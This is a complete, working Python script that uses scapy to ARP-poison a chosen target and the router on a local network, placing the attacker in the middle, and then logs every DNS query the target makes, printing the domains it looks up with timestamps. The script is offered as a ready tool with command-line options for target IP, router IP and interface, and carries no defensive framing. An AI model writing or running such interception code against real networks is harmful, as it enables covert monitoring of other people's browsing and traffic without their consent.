#!/usr/bin/python3

import argparse
import threading
from time import strftime, localtime
from colorama import Fore, Style
from scapy.all import arp_mitm, sniff, DNS

parser=argparse.ArgumentParser(description='Dns sniffer')
parser.add_argument('--targetip',help='Target device you want to watch',
                    required=True)
parser.add_argument('--iface',help='Interface to use for attack',required=True)
parser.add_argument('--routerip',help='IP of your home router',required=True)
opts = parser.parse_args()

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface
    
    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying...')
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53')

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
    
    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())
        
        t1.start()
        t2.start()

if __name__ == '__main__':
    device = Device(opts.routerip, opts.targetip, opts.iface)
    device.watch()
